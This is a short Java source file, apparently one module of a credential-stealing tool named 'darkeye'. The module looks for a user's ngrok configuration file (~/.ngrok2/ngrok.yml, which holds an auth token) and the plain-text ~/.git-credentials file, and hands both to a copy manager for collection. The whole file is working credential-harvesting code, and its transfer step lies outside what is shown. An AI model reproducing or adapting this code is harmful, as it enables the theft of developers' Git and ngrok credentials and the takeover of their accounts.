package org.spray.darkeye.module;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import org.spray.darkeye.managers.CopyManager;
import org.spray.darkeye.objects.Data;
import org.spray.darkeye.objects.FileData;

public class AppsModule extends CopyManager {

	public AppsModule(String path) {
		super(path);
	}

	@Override
	public String getPath() {
		return "Apps";
	}

	@Override
	protected List<Data> getData() {
		List<Data> data = new ArrayList<>();
		data.add(new Data(getFiles(), ""));
		return data;
	}

	private List<FileData> getFiles() {
		List<FileData> files = new ArrayList<>();

		if (getNGrok().exists())
			files.add(new FileData(getNGrok(), getNGrok().getName()));
		if (getGit().exists())
			files.add(new FileData(getGit(), getGit().getName()));

		return files;
	}

	private File getNGrok() {
		return new File(System.getProperty("user.home") + "/.ngrok2/ngrok.yml");
	}

	private File getGit() {
		return new File(System.getProperty("user.home") + "/.git-credentials");
	}

}
